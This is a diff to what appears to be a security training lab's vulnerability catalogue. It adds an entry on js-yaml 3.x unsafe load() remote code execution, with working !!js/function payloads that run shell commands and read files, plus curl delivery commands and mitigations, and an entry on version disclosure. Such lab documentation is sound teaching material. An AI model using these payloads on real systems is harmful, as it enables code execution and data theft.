@@ -152,6 +152,32 @@ V-SOC-017  Clickjacking (no X-Frame-Options / no CSP)
              on attacker page; bait the user to click while authenticated.
   Mitigation: X-Frame-Options=DENY or CSP frame-ancestors 'none'.
 
+V-SOC-018  Vulnerable component -- js-yaml@3.13.0 unsafe `load()` => RCE (CH 34)
+  Location:  routes/components.js  POST /components/import-profile
+             package.json:  "js-yaml": "^3.13.0"
+  Exploit:   # The lab calls yaml.load(body) (alias of `unsafeLoad` in 3.x)
+             # which honours custom YAML tags including !!js/function. The
+             # parsed `bio` property becomes a real Function; the lab then
+             # calls it.
+             cat > body.yml <<'EOF'
+             bio: !!js/function "function(){return process.mainModule.require('child_process').execSync('whoami').toString().trim()}"
+             EOF
+             curl -s -X POST http://127.0.0.1:3003/components/import-profile \
+               -H 'Content-Type: text/yaml' --data-binary @body.yml
+             # -> REDMOND+t-ibadawy  (or whatever the server user is)
+
+             # File read primitive:
+             bio: !!js/function "function(){return process.mainModule.require('fs').readFileSync('package.json','utf8')}"
+  Mitigation: - Upgrade js-yaml to >= 4.0.0 where `load()` is safe by default.
+              - On 3.x use `safeLoad()` (deprecated alias of safe parser).
+              - Never call functions returned by an untrusted parser.
+              - npm audit fix; SCA tools (Snyk, Dependabot, GitHub Advisory).
+
+V-SOC-019  Library version disclosure
+  Location:  routes/components.js  GET /components/version
+  Exploit:   curl http://127.0.0.1:3003/components/version
+  Mitigation: do not ship a public version endpoint.
+
 
 -----------------------------------------------------------------
 AUTH & SESSION
